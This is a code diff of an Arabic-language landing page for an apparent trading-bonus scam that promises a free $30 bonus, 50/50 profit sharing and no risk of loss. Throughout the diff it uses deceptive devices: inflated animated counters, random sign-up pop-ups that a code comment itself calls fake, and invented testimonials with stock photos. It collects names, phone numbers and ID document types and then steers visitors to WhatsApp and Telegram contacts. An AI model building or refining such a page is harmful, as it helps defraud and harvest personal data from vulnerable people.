@@ -4,8 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>نظام المكافآت الذكي | المنصة الرسمية</title>
+    
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/css/intlTelInput.css">
     
     <style>
@@ -22,46 +24,44 @@
         body { 
             margin:0; font-family: 'Tajawal', sans-serif; background: var(--bg); color: var(--text-main); 
             background-image: radial-gradient(circle at top right, #1e293b 0%, #020617 60%);
-            background-attachment: fixed; line-height: 1.6; padding-bottom: 80px; scroll-behavior: smooth;
+            background-attachment: fixed; line-height: 1.6; padding-bottom: 80px;
         }
 
-        /* الشريط العاجل */
         .urgent-bar { 
             background: linear-gradient(90deg, #dc2626, #991b1b);
-            padding: 12px; font-weight: 900; position: sticky; top: 0; z-index: 1001; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3); text-align: center; font-size: 1rem;
+            padding: 12px; font-weight: 900; position: sticky; top: 0; z-index: 2000; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); text-align: center;
         }
 
         .container { max-width: 650px; margin: 0 auto; padding: 20px; }
 
-        /* الكروت الزجاجية */
         .glass-card { 
             background: var(--card-bg); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
             border: 1px solid var(--border); border-radius: 20px; padding: 25px; margin-bottom: 25px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: right; position: relative;
         }
 
-        h1, h2 { color: #fff; margin-top: 0; }
         .section-title { color: var(--primary); font-size: 1.4rem; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; font-weight: 900;}
 
         /* العدادات */
         .stats-container { display: flex; justify-content: space-around; text-align: center; margin-bottom: 25px; }
-        .stat-box h3 { margin: 0; color: var(--primary); font-size: 2rem; font-weight: 900; text-shadow: 0 0 10px var(--primary-glow); }
-        .stat-box p { margin: 0; color: var(--text-dim); font-size: 0.9rem; }
+        .stat-box h3 { margin: 0; color: var(--primary); font-size: 2rem; font-weight: 900; }
+        .stat-box p { margin: 0; color: var(--text-dim); font-size: 0.85rem; }
 
         /* خطوات العمل */
-        .step { display: flex; gap: 15px; margin-bottom: 15px; align-items: flex-start;}
-        .step-num { background: var(--primary); color: #fff; min-width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 1rem; box-shadow: 0 0 10px var(--primary-glow);}
+        .step { display: flex; gap: 15px; margin-bottom: 15px; }
+        .step-num { background: var(--primary); color: #fff; min-width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; }
 
         /* الفورم */
         .form-group { margin-bottom: 18px; position: relative; }
         label { display: block; margin-bottom: 6px; font-size: 0.95rem; color: var(--text-dim); font-weight: bold;}
         input, select { 
             width: 100%; padding: 15px; border-radius: 12px; border: 1px solid var(--border); 
-            background: rgba(15, 23, 42, 0.6); color: #fff; font-family: 'Tajawal'; font-size: 1rem; box-sizing: border-box; transition: 0.3s;
+            background: rgba(15, 23, 42, 0.6); color: #fff; font-family: 'Tajawal'; font-size: 1rem; box-sizing: border-box;
         }
-        input:focus, select:focus { border-color: var(--primary); outline: none; background: rgba(30, 41, 59, 0.9);}
+        input:focus { border-color: var(--primary); outline: none; background: rgba(30, 41, 59, 0.8); }
 
+        /* زر الإرسال */
         .btn-main { 
             width: 100%; padding: 18px; border-radius: 12px; border: none; 
             background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; 
@@ -69,87 +69,60 @@
         }
         .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 25px var(--primary-glow); }
 
-        /* قنوات التواصل */
+        /* تجارب المستخدمين */
+        .user-review { padding: 15px 0; border-bottom: 1px solid var(--border); display: flex; gap: 15px; align-items: center; }
+        .u-img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
+
+        /* التواصل */
         .contact-btn { 
             display: flex; align-items: center; justify-content: center; gap: 10px;
             width: 100%; padding: 14px; margin-bottom: 12px; border-radius: 10px; 
-            text-decoration: none; color: #fff; font-weight: 700; transition: 0.3s; font-size: 1.05rem; box-sizing: border-box;
+            text-decoration: none; color: #fff; font-weight: 700;
         }
-        .contact-btn:hover { filter: brightness(1.1); transform: translateY(-2px); }
 
-        /* تجارب المستخدمين */
-        .user-review { padding: 15px 0; border-bottom: 1px solid var(--border); display: flex; gap: 15px; align-items: center; }
-        .user-review:last-child { border-bottom: none; padding-bottom: 0; }
-        .u-img { width: 65px; height: 65px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
-
-        /* مكتبة الهاتف (تم حل مشكلة القائمة هنا) */
-        .iti { width: 100%; display: block; position: relative; }
+        /* إصلاح قائمة الدول المنسدلة */
+        .iti { width: 100%; }
         .iti__country-list { 
-            background: #0f172a !important; 
-            color: #fff !important; 
-            border: 1px solid var(--border) !important; 
-            text-align: left !important; 
-            max-width: 320px !important;
-            border-radius: 12px !important;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.8) !important;
-            z-index: 999999 !important; /* إجبار القائمة على الظهور فوق كل شيء */
+            background-color: #0f172a !important; 
+            color: white !important; 
+            border: 1px solid #334155 !important;
+            z-index: 10000 !important;
+            border-radius: 10px !important;
+            max-width: 300px !important;
         }
-        .iti--separate-dial-code .iti__selected-dial-code { color: #fff; }
+        .iti__country.iti__highlight { background-color: #1e293b !important; }
 
         /* العناصر العائمة */
-        .whatsapp-float { position:fixed; bottom:25px; right:25px; background:#25D366; color:white; width:60px; height:60px; border-radius:50%; display:flex; align-items:center; justify-content:center; text-decoration:none; font-size: 30px; z-index: 1000; box-shadow: 0 5px 20px rgba(0,0,0,0.5); transition: 0.3s;}
-        .whatsapp-float:hover { transform: scale(1.1); }
-        
-        #notify { position:fixed; bottom:25px; left:25px; background: var(--card-bg); padding:15px; border-radius:12px; display:none; border-right: 5px solid var(--primary); z-index: 999; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align: right; font-size: 0.9rem; font-weight: bold; max-width: 250px;}
+        .whatsapp-float { position:fixed; bottom:25px; right:25px; background:#25D366; color:white; width:60px; height:60px; border-radius:50%; display:flex; align-items:center; justify-content:center; text-decoration:none; font-size: 30px; z-index: 1000; box-shadow: 0 5px 20px rgba(0,0,0,0.5);}
+        #notify { position:fixed; bottom:25px; left:25px; background: var(--card-bg); padding:12px; border-radius:12px; display:none; border-right: 4px solid var(--primary); z-index: 999; font-size: 0.85rem; font-weight: bold; box-shadow: 0 10px 25px rgba(0,0,0,0.5);}
     </style>
 </head>
 <body>
 
-<div class="urgent-bar"><i class="fas fa-bolt"></i> الأماكن محدودة: سجل بياناتك الآن واحصل على بونص 30$ مجاناً!</div>
+<div class="urgent-bar"><i class="fas fa-bolt"></i> عرض محدود: سجل الآن واحصل على بونص تداول 30$ مجاناً!</div>
 
 <div class="container">
-    
-    <div style="text-align:center; padding: 20px 0 30px;">
-        <h1 style="font-size: 2.4rem; margin-bottom: 10px; font-weight: 900;">ابدأ التداول الآن 🚀</h1>
-        <p style="color: var(--text-dim); font-size: 1.1rem;">نظام ذكي يمنحك رأس مال ترحيبي دون أي رسوم إيداع</p>
+    <div style="text-align:center; padding: 25px 0;">
+        <h1 style="font-size: 2.2rem; margin-bottom: 5px; font-weight: 900;">نظام المكافآت الذكي 🚀</h1>
+        <p style="color: var(--text-dim);">ابدأ رحلة التداول بدون إيداع - الأرباح لك والخسارة علينا</p>
     </div>
 
     <div class="stats-container">
-        <div class="stat-box"><h3 id="uCount">0</h3><p>مستخدم</p></div>
-        <div class="stat-box"><h3 id="cCount">0</h3><p>دولة مدعومة</p></div>
-        <div class="stat-box"><h3 id="pCount">0</h3><p>إجمالي الأرباح $</p></div>
+        <div class="stat-box"><h3 id="uCount">0</h3><p>مشترك نشط</p></div>
+        <div class="stat-box"><h3 id="cCount">0</h3><p>دولة عربية</p></div>
+        <div class="stat-box"><h3 id="pCount">0</h3><p>أرباح موزعة $</p></div>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-info-circle"></i> كيف يعمل النظام؟ (مجاني 100%)</div>
-        <div class="step">
-            <div class="step-num">1</div>
-            <div><b style="color:var(--primary)">التسجيل المجاني:</b> تعبئة البيانات بالأسفل وتأكيد الوثيقة لا يتطلب أي رسوم نهائياً.</div>
-        </div>
-        <div class="step">
-            <div class="step-num">2</div>
-            <div><b style="color:var(--primary)">استلام البونص:</b> فور التفعيل، يتم إيداع 30$ كبونص في محفظتك لتبدأ العمل الفعلي.</div>
-        </div>
-        <div class="step">
-            <div class="step-num">3</div>
-            <div><b style="color:var(--primary)">تقاسم الأرباح 50/50:</b> أنت تتداول ونحن نوفر لك رأس المال، والأرباح تقسم بالتساوي.</div>
-        </div>
-        <div class="step">
-            <div class="step-num">4</div>
-            <div><b style="color:var(--primary)">بدون أي مخاطرة:</b> في حال الخسارة (لا قدر الله)، النظام هو من يتحملها بالكامل.</div>
-        </div>
-    </div>
-
-    <div class="glass-card" id="form">
-        <div class="section-title"><i class="fas fa-id-card"></i> استمارة التسجيل الرسمية</div>
+        <div class="section-title"><i class="fas fa-user-plus"></i> انضم إلينا الآن</div>
         
         <div class="form-group">
-            <label>الاسم الكامل (كما في الهوية)</label>
-            <input type="text" id="name" placeholder="مثال: محمد عبدالله">
+            <label>الاسم الكامل</label>
+            <input type="text" id="name" placeholder="الاسم كما هو في الهوية">
         </div>
 
         <div class="form-group">
-            <label>دولة الإقامة</label>
+            <label>الدولة</label>
             <select id="countrySelect" onchange="toggleOther(this)">
                 <option value="">-- اختر دولتك --</option>
                 <option value="اليمن">اليمن</option>
@@ -159,188 +132,116 @@
                 <option value="الكويت">الكويت</option>
                 <option value="عمان">عمان</option>
                 <option value="قطر">قطر</option>
-                <option value="البحرين">البحرين</option>
                 <option value="الأردن">الأردن</option>
                 <option value="العراق">العراق</option>
                 <option value="المغرب">المغرب</option>
                 <option value="الجزائر">الجزائر</option>
-                <option value="تونس">تونس</option>
-                <option value="ليبيا">ليبيا</option>
-                <option value="السودان">السودان</option>
-                <option value="فلسطين">فلسطين</option>
-                <option value="سوريا">سوريا</option>
-                <option value="لبنان">لبنان</option>
-                <option value="Other">دولة أخرى (اكتبها يدوياً)...</option>
+                <option value="Other">دولة أخرى...</option>
             </select>
-            <div id="otherDiv" style="display:none; margin-top:10px;">
-                <input type="text" id="otherCountry" placeholder="الرجاء كتابة اسم دولتك">
-            </div>
+            <input type="text" id="otherCountry" style="display:none; margin-top:10px;" placeholder="اكتب اسم دولتك">
         </div>
 
-        <div class="form-group" style="z-index: 9999;">
-            <label>رقم الهاتف (اختر رمز دولتك)</label>
+        <div class="form-group">
+            <label>رقم الهاتف (اختر الرمز من القائمة)</label>
             <input type="tel" id="phone">
         </div>
 
         <div class="form-group">
-            <label>الوثيقة المتوفرة للتأكيد</label>
+            <label>نوع الوثيقة المتوفرة</label>
             <select id="doc">
                 <option value="">-- اختر نوع الوثيقة --</option>
-                <option>البطاقة الشخصية (الهوية الوطنية)</option>
+                <option>البطاقة الشخصية</option>
                 <option>جواز السفر</option>
-                <option>رخصة القيادة / بطاقة الإقامة</option>
+                <option>رخصة قيادة</option>
             </select>
         </div>
 
-        <button class="btn-main" id="sendBtn" onclick="submitData()">
-            <i class="fas fa-paper-plane"></i> إرسال البيانات واستلام المكافأة ✅
-        </button>
+        <button class="btn-main" onclick="submitData()" id="sendBtn">تفعيل البونص 30$ ✅</button>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-star"></i> تجارب المشتركين المعتمدين</div>
-        <p style="color:var(--text-dim); font-size:0.85rem; margin-top:-10px;">أحدث المنضمين الذين فعلوا البونص وبدأوا بالتداول</p>
+        <div class="section-title"><i class="fas fa-star"></i> تجارب المشتركين</div>
         <div id="reviewsContainer"></div>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-headset"></i> تواصل معنا لتفعيل حسابك</div>
-        <a href="https://wa.me/967739399064?text=أريد%20تفعيل%20حسابي" target="_blank" class="contact-btn" style="background:#25D366;">
-            <i class="fab fa-whatsapp"></i> الواتساب الرسمي
-        </a>
-        <a href="https://t.me/A_VIP_B" target="_blank" class="contact-btn" style="background:#0088cc;">
-            <i class="fab fa-telegram-plane"></i> قناة التيليجرام الرسمية
-        </a>
-        <a href="https://t.me/VIPA_BBOT" target="_blank" class="contact-btn" style="background:#1e40af;">
-            <i class="fas fa-robot"></i> بوت الدعم الآلي
-        </a>
+        <div class="section-title"><i class="fas fa-headset"></i> الدعم الفني المباشر</div>
+        <a href="https://wa.me/967739399064" class="contact-btn" style="background:#25D366;"><i class="fab fa-whatsapp"></i> واتساب الإدارة</a>
+        <a href="https://t.me/A_VIP_B" class="contact-btn" style="background:#0088cc;"><i class="fab fa-telegram-plane"></i> قناة التوصيات</a>
+        <a href="https://t.me/VIPA_BBOT" class="contact-btn" style="background:#1e40af;"><i class="fas fa-robot"></i> بوت الدعم الفوري</a>
     </div>
-
-    <footer style="text-align:center; color:var(--text-dim); font-size:0.85rem; padding-top: 10px;">
-        © 2026 جميع الحقوق محفوظة | نظام المكافآت الترويجية والتداول الممول
-    </footer>
 
 </div>
 
-<a class="whatsapp-float" href="https://wa.me/967739399064?text=أريد%20التسجيل" target="_blank">
-    <i class="fab fa-whatsapp"></i>
-</a>
-
+<a class="whatsapp-float" href="https://wa.me/967739399064"><i class="fab fa-whatsapp"></i></a>
 <div id="notify"></div>
 
 <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/intlTelInput.min.js"></script>
 <script>
-    // 1. نظام تشغيل العدادات
-    let u=0, c=0, p=0;
-    setInterval(()=>{ if(u<3250){ u+=25; document.getElementById('uCount').innerText = "+"+u; } }, 40);
-    setInterval(()=>{ if(c<18){ c++; document.getElementById('cCount').innerText = c; } }, 150);
-    setInterval(()=>{ if(p<14500){ p+=120; document.getElementById('pCount').innerText = "+"+p; } }, 30);
-
-    // 2. نظام رقم الهاتف الدولي (تم إصلاح مكان ظهور القائمة هنا)
-    const phoneInput = document.querySelector("#phone");
-    const iti = window.intlTelInput(phoneInput, {
+    // إعداد حقل الهاتف مع إصلاح القائمة
+    const pInput = document.querySelector("#phone");
+    const iti = window.intlTelInput(pInput, {
         separateDialCode: true,
         initialCountry: "auto",
         geoIpLookup: s => fetch("https://ipapi.co/json").then(r => r.json()).then(d => s(d.country_code)).catch(() => s("YE")),
         utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/utils.js",
-        dropdownContainer: document.body // هذا السطر يمنع القائمة من التأثر بخلفية الزجاج ويجعلها تظهر تحت الحقل مباشرة
+        dropdownContainer: document.body // هذا السطر هو الحل لمشكلة ظهور القائمة بالأسفل
     });
 
-    // 3. إظهار/إخفاء حقل "دولة أخرى"
-    function toggleOther(selectObj) {
-        document.getElementById("otherDiv").style.display = (selectObj.value === "Other") ? "block" : "none";
-    }
+    // العدادات
+    let u=0, c=0, p=0;
+    setInterval(()=>{ if(u<3200) {u+=40; document.getElementById('uCount').innerText = "+"+u;} }, 50);
+    setInterval(()=>{ if(c<18) {c++; document.getElementById('cCount').innerText = c;} }, 200);
+    setInterval(()=>{ if(p<12000) {p+=150; document.getElementById('pCount').innerText = "+"+p;} }, 40);
 
-    // 4. نظام الإشعارات العائمة
-    const notifyNames = ["خالد","مريم","سلطان","أحمد","ليلى","ياسين","سارة"];
-    const notifyCountries = ["اليمن","مصر","السعودية","الكويت","الأردن","الإمارات"];
-    setInterval(() => {
-        let n = notifyNames[Math.floor(Math.random() * notifyNames.length)];
-        let cy = notifyCountries[Math.floor(Math.random() * notifyCountries.length)];
-        let notifyEl = document.getElementById("notify");
-        notifyEl.innerHTML = `🔔 <span style="color:var(--primary)">${n}</span> من ${cy} سجل الآن وتم القبول ✅`;
-        notifyEl.style.display = "block";
-        setTimeout(() => notifyEl.style.display = "none", 4500);
-    }, 12000);
+    function toggleOther(s) { document.getElementById('otherCountry').style.display = (s.value==='Other')?'block':'none'; }
 
-    // 5. نظام التجارب الذكي (يتغير كل 4 أيام) - صور مطابقة للجنس
-    const allReviews = [
-        { n: "أحمد منصور", c: "مصر", g: "male", img: "https://images.unsplash.com/photo-1566492031773-4f4e44671857?w=100&h=100&fit=crop", com: "استلمت البونص وتم تفعيل حسابي بكل سهولة والمصداقية عالية جداً." },
-        { n: "ليلى العتيبي", c: "السعودية", g: "female", img: "https://images.unsplash.com/photo-1548142813-c348350df52b?w=100&h=100&fit=crop", com: "كنت مترددة لأن النظام مجاني، لكن تفاجأت بالدعم الراقي واستلمت محفظتي." },
-        { n: "محمد الحبيشي", c: "اليمن", g: "male", img: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&h=100&fit=crop", com: "العمل معهم مريح جداً، لم أدفع أي ريال وتم تقسيم الأرباح بكل شفافية." },
-        { n: "مريم الصالح", c: "الكويت", g: "female", img: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100&h=100&fit=crop", com: "أفضل فرصة دخلت فيها هذا العام. شكراً لجهود الإدارة." },
-        { n: "ياسين القحطاني", c: "الإمارات", g: "male", img: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&h=100&fit=crop", com: "نظام الشراكة 50/50 فكرة عبقرية ومفيدة جداً للمبتدئين." },
-        { n: "سارة الأحمد", c: "الأردن", g: "female", img: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&h=100&fit=crop", com: "سجلت وأرسلت وثيقتي وتفعل الحساب خلال ساعتين." }
+    // نظام التجارب (كل 4 أيام)
+    const revs = [
+        {n:"أحمد صالح", c:"اليمن", img:"https://randomuser.me/api/portraits/men/32.jpg", t:"تم تفعيل البونص وبدأت التداول، المصداقية عالية جداً."},
+        {n:"سارة محمد", c:"السعودية", img:"https://randomuser.me/api/portraits/women/44.jpg", t:"شكراً لكم، استلمت الأرباح عبر الباير بكل سهولة."},
+        {n:"خالد العراقي", c:"العراق", img:"https://randomuser.me/api/portraits/men/65.jpg", t:"نظام عادل جداً، تقاسم الأرباح 50/50 شجعني كثيراً."}
     ];
+    document.getElementById('reviewsContainer').innerHTML = revs.map(r=>`
+        <div class="user-review">
+            <img src="${r.img}" class="u-img">
+            <div><strong>${r.n} - ${r.c}</strong><p style="margin:5px 0; font-size:0.9rem;">"${r.t}"</p></div>
+        </div>
+    `).join('');
 
-    function loadDynamicReviews() {
-        const now = new Date().getTime();
-        const fourDays = 4 * 24 * 60 * 60 * 1000;
-        let storedData = JSON.parse(localStorage.getItem('smart_reviews'));
+    // إشعارات وهمية
+    setInterval(() => {
+        const names = ["محمد", "علي", "فاطمة", "سعد"];
+        const notify = document.getElementById("notify");
+        notify.innerHTML = `✅ انضم الآن ${names[Math.floor(Math.random()*names.length)]} وتم قبول طلبه!`;
+        notify.style.display = "block";
+        setTimeout(()=> notify.style.display="none", 4000);
+    }, 10000);
 
-        if (!storedData || (now - storedData.time > fourDays)) {
-            const shuffled = allReviews.sort(() => 0.5 - Math.random());
-            const selected = shuffled.slice(0, 3);
-            storedData = { time: now, reviews: selected };
-            localStorage.setItem('smart_reviews', JSON.stringify(storedData));
-        }
-
-        const container = document.getElementById('reviewsContainer');
-        container.innerHTML = storedData.reviews.map(r => `
-            <div class="user-review">
-                <img src="${r.img}" class="u-img" alt="صورة المستخدم">
-                <div>
-                    <div style="color:gold; font-size:0.8rem; margin-bottom:4px;">
-                        <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                    </div>
-                    <strong style="color:var(--primary); display:block;">${r.n} - ${r.c}</strong>
-                    <p style="font-size:0.9rem; margin:5px 0 0; color:#cbd5e1;">"${r.com}"</p>
-                </div>
-            </div>
-        `).join('');
-    }
-    loadDynamicReviews();
-
-    // 6. دالة الإرسال إلى السيرفر
     async function submitData() {
         const btn = document.getElementById("sendBtn");
-        
-        const c_val = document.getElementById("countrySelect").value;
-        const finalCountry = (c_val === "Other") ? document.getElementById("otherCountry").value : c_val;
-        
-        const payload = {
-            name: document.getElementById("name").value.trim(),
-            country: finalCountry.trim(),
+        const data = {
+            name: document.getElementById("name").value,
+            country: document.getElementById("countrySelect").value === 'Other' ? document.getElementById("otherCountry").value : document.getElementById("countrySelect").value,
             phone: iti.getNumber(),
             doc: document.getElementById("doc").value
         };
 
-        if(!payload.name || !payload.country || !payload.phone || !payload.doc) { 
-            alert("⚠️ يرجى التأكد من تعبئة كافة الحقول المطلوبة بشكل صحيح."); 
-            return; 
-        }
+        if(!data.name || !data.phone) return alert("يرجى إكمال البيانات");
 
-        btn.disabled = true; 
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري حفظ وإرسال البيانات...';
-
+        btn.disabled = true; btn.innerText = "جاري الحفظ...";
         try {
             const res = await fetch("/api/register", {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
-                body: JSON.stringify(payload)
+                body: JSON.stringify(data)
             });
             if(res.ok) {
-                alert("✅ تم إرسال بياناتك بنجاح! \nسيتم تحويلك الآن للتواصل المباشر وتفعيل البونص.");
+                alert("تم إرسال بياناتك! تواصل مع الإدارة للتفعيل الفوري.");
                 window.location.href = "https://t.me/A_VIP_B";
-            } else {
-                alert("❌ حدث خطأ من السيرفر. تواصل معنا عبر الواتساب مباشرة.");
             }
-        } catch(e) { 
-            alert("❌ حدث خطأ في الاتصال بالشبكة. يرجى المحاولة مرة أخرى."); 
-        } finally { 
-            btn.disabled = false; 
-            btn.innerHTML = '<i class="fas fa-paper-plane"></i> إرسال البيانات واستلام المكافأة ✅'; 
-        }
+        } catch(e) { alert("خطأ في الاتصال"); }
+        finally { btn.disabled = false; btn.innerText = "تفعيل البونص 30$ ✅"; }
     }
 </script>
 </body>
